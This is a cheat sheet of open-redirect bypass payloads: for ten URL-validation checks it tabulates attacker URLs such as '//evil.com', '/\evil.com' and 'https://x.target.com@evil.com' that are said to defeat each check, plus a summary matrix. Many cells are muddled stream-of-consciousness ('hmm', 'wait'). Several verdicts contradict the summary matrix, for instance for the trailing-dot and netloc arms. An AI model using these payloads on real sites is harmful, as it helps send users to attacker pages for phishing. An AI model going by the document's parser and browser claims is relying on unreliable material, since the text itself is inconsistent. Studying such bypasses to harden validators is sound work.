# Per-check — each filter-shape and the arms that defeat it

## Check 1 — `startswith('/')` (the "must be a path" check)

```python
if next_url.startswith('/'): redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `/dashboard` | `Location: /dashboard` | the intended relative — a negative |
| `//evil.com` | `Location: //evil.com` -> browser goes to `https://evil.com` | `//` starts `/`, host=`evil.com` — THE classic bypass |
| `\/evil.com` | `Location: \/evil.com` -> browser goes to `evil.com` | `\/` — starts `/`? no — `\/` = `\`+`/`, the `\` is first — hmm, `\/evil.com` starts `\` not `/` — the check `startswith('/')` FAILS on `\/`; the arm is `/\evil.com` |
| `/\evil.com` | `Location: /\evil.com` -> browser: `\`->`/` -> `//evil.com` | `/` + `\` — starts `/`, browser normalizes `\`->`/` |
| `/\/evil.com` | `Location: /\/evil.com` -> `//evil.com`? — `/\/` = `//`? — the `\/` becomes `//`? — the browser: `/\/evil.com` -> the `\` is a sep -> `//evil.com` | a /\/ mix |
| `/%5cevil.com` | `Location: /%5cevil.com` -> decoded `/\evil.com` -> `//evil.com` | the encoded `\` |
| `//evil.com` variants | `///evil.com`, `////evil.com`, `//\\evil.com`, `//\evil.com` | the multi-slash/backslash |

## Check 2 — `startswith('/') AND not startswith('//')` (the hardened path check)

```python
if next_url.startswith('/') and not next_url.startswith('//'): redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `/\evil.com` | `Location: /\evil.com` -> `//evil.com` | `/` + `\` — starts `/`, not `//`; browser `\`->`/` |
| `/%5cevil.com` | `Location: /%5cevil.com` -> `//evil.com` | encoded `\` |
| `/\/evil.com` | `Location: /\/evil.com` -> `//evil.com` | the `/\/` mix |
| `/%2fevil.com` | `Location: /%2fevil.com` -> `//evil.com`? — `%2f` decodes to `/` -> `//evil.com` | the encoded `/` |
| `/\\evil.com` | `Location: /\\evil.com` -> `//evil.com`? | the `/\\` |

## Check 3 — `'target.com' in next` (the substring check)

```python
if 'target.com' in next_url: redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `https://evil.com/target.com` | `Location: https://evil.com/target.com` | the substring in the path |
| `https://evil.com?target.com` | in the query | the substring in the query |
| `https://evil.com#target.com` | in the fragment | the substring in the fragment |
| `https://target.com.evil.com` | `Location: https://target.com.evil.com` | the substring in the HOST (a subdomain) — the host ends `evil.com` — CANDIDATE |
| `https://eviltarget.com` | `Location: https://eviltarget.com` | the no-boundary contains-match |
| `https://target-com.evil.com` | `Location: https://target-com.evil.com` | a similar-name |

## Check 4 — `endswith('target.com')` (the suffix check)

```python
if next_url.endswith('target.com'): redirect(next_url)   # on the URL-STRING
```

| The arm | The result | Why |
|---|---|---|
| `https://evil.com/target.com` | `Location: https://evil.com/target.com` | the STRING ends `target.com`, host=`evil.com` |
| `https://eviltarget.com` | `Location: https://eviltarget.com` | the host STRING ends `target.com` (no boundary) — host=`eviltarget.com` |

```python
if urlparse(next_url).hostname.endswith('target.com'): redirect(next_url)   # on the HOST
```

| The arm | The result | Why |
|---|---|---|
| `https://target.com.evil.com` | host=`target.com.evil.com` ends `evil.com` not `target.com` — FAILS — wait, `target.com.evil.com`.endswith('target.com')? no, ends `evil.com` — hmm — the host `x.target.com` ends `target.com` -> PASSES but host is `x.target.com` — a SUBDOMAIN of target.com — same-origin-ish? a subdomain isn't the apex — if the allowlist intends `target.com` but `*.target.com` passes the endswith, a subdomain-takeover/x.target.com is the bypass |
| `https://eviltarget.com` | host=`eviltarget.com` ends `target.com` -> PASSES -> CANDIDATE (the no-boundary) |

## Check 5 — `urlparse(next).hostname == 'target.com'` (the exact-host check)

| The arm | The result | Why |
|---|---|---|
| `https://target.com@evil.com` | `hostname`=`evil.com` ≠ `target.com` — FAILS — the netloc is `target.com@evil.com` | the userinfo separates; the check reads hostname correctly — the arm needs a check on `netloc` or a substring |
| `https://evil.com\@target.com` | `urlparse` reads `hostname`=`evil.com\@target.com`? or splits on `@`? — the `\@` parse differs | the differential |
| `https://target.com.` | `hostname`=`target.com.` ≠ `target.com` — the trailing-dot | DNS-normalizes to `target.com` — the `.` |
| `https://TARGET.COM` | `hostname`=`target.com` (lowercased) — passes — a negative | the case-normalization |
| `https://target.com:443` | `hostname`=`target.com` — passes — a negative | the port is stripped by hostname |

## Check 6 — `urlparse(next).netloc == 'target.com'` (the netloc check)

| The arm | The result | Why |
|---|---|---|
| `https://target.com@evil.com` | `netloc`=`target.com@evil.com` ≠ `target.com` — FAILS | the userinfo is in netloc |
| `https://target.com.` | `netloc`=`target.com.` ≠ `target.com` — FAILS | the trailing-dot |
| `https://target.com:443` | `netloc`=`target.com:443` ≠ `target.com` — FAILS | the port |
| `https://target.com` | `netloc`=`target.com` — passes — a negative | the intended |

## Check 7 — `scheme in [http, https]` (the scheme check)

```python
if urlparse(next_url).scheme in ('http','https'): redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `javascript:alert(1)` | `scheme`=`javascript` — FAILS | the scheme is rejected |
| `//evil.com` | `scheme`='' — FAILS | the scheme-relative has no scheme — hmm — `urlparse('//evil.com').scheme`='' — `'' in ('http','https')`? no — FAILS — but the browser treats `//evil.com` as scheme-relative — the check's `scheme in` rejects `//` — a mismatch the check catches |
| `https:evil.com` | `scheme`='https' — PASSES; the browser resolves `https:evil.com` -> `https://target.com/evil.com`? or `https://evil.com`? — WHATWG: `https:evil.com` is an absolute-URL-with-scheme-no-// — host=`evil.com`? — the WHATWG URL resolves `https:evil.com` against a base — `new URL('https:evil.com','https://target.com')` -> `https://evil.com/` — YES — the scheme+no-// bypass |
| `HTTPS://evil.com` | `scheme`=`https` (lowercased) — passes — a negative | the case |

## Check 8 — the no-`://` check

```python
if '://' not in next_url and next_url.startswith('/'): redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `//evil.com` | `://` not in `//evil.com` — passes the `not '://'`; `startswith('/')` — passes — `Location: //evil.com` -> cross-origin | the `//` has no `://` |
| `\\evil.com` | `://` not in it; `startswith('/')`? `\\evil.com` starts `\` not `/` — FAILS the startswith — hmm — the arm needs `/`-prefix: `/\evil.com`? — `/\evil.com` starts `/`, no `://` — passes; browser `\`->`/` -> `//evil.com` | the `/\` |

## Check 9 — the regex check

```python
if re.match(r'^https?://(?:[a-z0-9-]+\.)*target\.com', next_url): redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `https://x.target.com@evil.com` | the regex matches `https://x.target.com` prefix; the URL is `x.target.com@evil.com` — host=`evil.com` — CANDIDATE | the regex matches the PREFIX, the browser reads the whole |
| `https://target.com.evil.com` | the regex matches `(?:...)*target\.com` — `target.com.evil.com`? — the regex `[a-z0-9-]+\.)*target\.com` — `target.com` is the required tail; `x.target.com` matches; `target.com.evil.com` — the regex `...target\.com` then `\.evil\.com`? — `re.match` anchors at start — `https://target.com.evil.com` — the `(?:[a-z0-9-]+\.)*` matches `target.` then `target\.com` needs `evil`... — hmm, `target.com.evil.com` — the regex `^(?:[a-z0-9-]+\.)*target\.com` — after `https://`, `[a-z0-9-]+\.` could match `target.` `com.` `evil.` — no `target.com` at the end — FAILS? — actually `[a-z0-9-]+\.` can't match `com` alone... — the regex is finicky; the `x.target.com@evil.com` userinfo is the cleaner arm |
| `https://target.com\@evil.com` | the `\@` | the `\@` |

## Check 10 — the allowlist `host in allowed`

```python
if urlparse(next_url).hostname in ('target.com','app.com'): redirect(next_url)
```

| The arm | The result | Why |
|---|---|---|
| `https://target.com@evil.com` | `hostname`=`evil.com` — FAILS | the userinfo |
| `https://target.com.evil.com` | `hostname`=`target.com.evil.com` — FAILS | the subdomain |
| `https://target.com.` | `hostname`=`target.com.` — FAILS | the trailing-dot |
| `https://evil.com\@target.com` | `hostname`=the `\@`-parse | the differential |
| `https://%74arget.com` | `hostname`=the decoded host | an encoded-host |

## The check-to-arm matrix

| The check | The defeating arm family |
|---|---|
| `startswith('/')` | `//evil.com`, `/\evil.com`, `/%5cevil.com` |
| `startswith('/') && !//` | `/\evil.com`, `/%5cevil.com`, `/\/evil.com` |
| `contains('target.com')` | `evil.com/target.com`, `evil.com?target.com`, `target.com.evil.com`, `eviltarget.com` |
| `endswith('target.com')` on string | `evil.com/target.com`, `eviltarget.com` |
| `endswith('target.com')` on host | `eviltarget.com`, `x.target.com` (subdomain) |
| `hostname == 'target.com'` | `evil.com\@target.com`, `target.com.`, the `@`-parse-gap |
| `netloc == 'target.com'` | the userinfo/port/dot arms (the netloc is strict) |
| `scheme in [http,https]` | `https:evil.com`, `javascript:`(rejected), `//`(rejected) |
| `no '://'` | `//evil.com`, `\\evil.com`, `/\evil.com` |
| the regex | `x.target.com@evil.com`, `target.com\@evil.com` |
| `host in allowed` | `evil.com\@target.com`, `target.com.`, the encoded-host |
